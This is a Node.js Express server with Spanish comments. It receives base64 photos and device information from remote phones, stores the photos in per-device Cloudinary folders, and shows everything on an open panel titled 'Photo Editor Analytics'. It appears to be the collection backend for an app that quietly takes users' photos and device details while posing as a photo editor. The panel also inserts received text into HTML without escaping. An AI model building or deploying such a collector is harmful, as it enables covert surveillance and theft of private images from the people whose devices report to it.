require('dotenv').config();
const express = require('express');
const cloudinary = require('cloudinary').v2;

const app = express();
// Railway asigna el puerto automáticamente
const port = process.env.PORT || 8080; 

// Permitir recibir textos largos de imágenes en Base64
app.use(express.json({ limit: '50mb' }));

// Configuración de Cloudinary (Usa tus variables de Railway)
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET
});

// Base de datos temporal para el panel web
const receivedData = {
    devices: {},
    photos: []
};

app.get('/', (req, res) => {
  res.send('🚀 Servidor de Analytics activo y corriendo en internet.');
});

// 1. ENDPOINT PARA RECIBIR FOTOS (Decodifica Base64 y sube a Cloudinary)
app.post('/api/upload-photo', async (req, res) => {
    try {
        const { device_id, filename, image, timestamp } = req.body;
        
        if (!image) {
            return res.status(400).json({ error: 'No se recibió ninguna imagen.' });
        }

        // Formatear el Base64 seguro para enviarlo a internet
        const archivoBase64 = `data:image/jpeg;base64,${image}`;

        // Subir a Cloudinary de forma permanente
        const resultado = await cloudinary.uploader.upload(archivoBase64, {
            folder: `dispositivos/${device_id}`
        });

        // Registrar en la base de datos del panel
        receivedData.photos.push({
            device_id,
            filename,
            url: resultado.secure_url,
            timestamp: timestamp || new Date()
        });

        if (receivedData.devices[device_id]) {
            receivedData.devices[device_id].photo_count += 1;
        }

        console.log(`📸 Foto guardada en Cloudinary de ${device_id}: ${filename}`);
        res.json({ status: 'ok', url: resultado.secure_url });

    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Error al procesar la imagen' });
    }
});

// 2. ENDPOINT PARA INFO DEL DISPOSITIVO
app.post('/api/device-info', (req, res) => {
    const { device_id, data, timestamp } = req.body;
    
    if (!receivedData.devices[device_id]) {
        receivedData.devices[device_id] = {
            first_seen: timestamp || new Date(),
            last_seen: timestamp || new Date(),
            info: typeof data === 'object' ? JSON.stringify(data, null, 2) : data,
            photo_count: 0
        };
    } else {
        receivedData.devices[device_id].last_seen = timestamp || new Date();
        receivedData.devices[device_id].info = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
    }
    
    console.log(`📱 Info recibida de ${device_id}`);
    res.json({ status: 'ok' });
});

// 3. PANEL WEB EN VIVO PARA VER TUS DATOS Y FOTOS
app.get('/panel', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Photo Editor Analytics</title>
        <meta charset="utf-8">
        <style>
            body { font-family: Arial, sans-serif; background: #1e1e2e; color: #cdd6f4; padding: 20px; }
            .device { background: #313244; border: 1px solid #45475a; margin: 10px 0; padding: 15px; border-radius: 8px; }
            pre { background: #11111b; padding: 10px; border-radius: 4px; overflow-x: auto; color: #a6e3a1; }
            .gallery { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 15px; }
            .photo-card { background: #11111b; padding: 10px; border-radius: 6px; text-align: center; }
            .photo { width: 180px; height: auto; border-radius: 4px; display: block; margin-bottom: 5px; }
            button { background: #89b4fa; color: #11111b; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; }
            button:hover { background: #b4befe; }
        </style>
    </head>
    <body>
        <h1>📊 Dispositivos Conectados: ${Object.keys(receivedData.devices).length}</h1>
        
        ${Object.entries(receivedData.devices).map(([id, device]) => `
            <div class="device">
                <h3>📱 ID Dispositivo: ${id}</h3>
                <p><b>Primera conexión:</b> ${device.first_seen}</p>
                <p><b>Última conexión:</b> ${device.last_seen}</p>
                <p><b>Total Fotos:</b> ${device.photo_count}</p>
                <h4>Especificaciones del Sistema:</h4>
                <pre>${device.info}</pre>
                
                <h4>Galería de Imágenes:</h4>
                <div class="gallery">
                    ${receivedData.photos.filter(p => p.device_id === id).map(photo => `
                        <div class="photo-card">
                            <img class="photo" src="${photo.url}" target="_blank">
                            <small>${photo.filename}</small>
                        </div>
                    `).join('')}
                </div>
            </div>
        `).join('')}
    </body>
    </html>
    `;
    res.send(html);
});

app.listen(port, () => {
    console.log(`🚀 Servidor escuchando en puerto ${port}`);
});
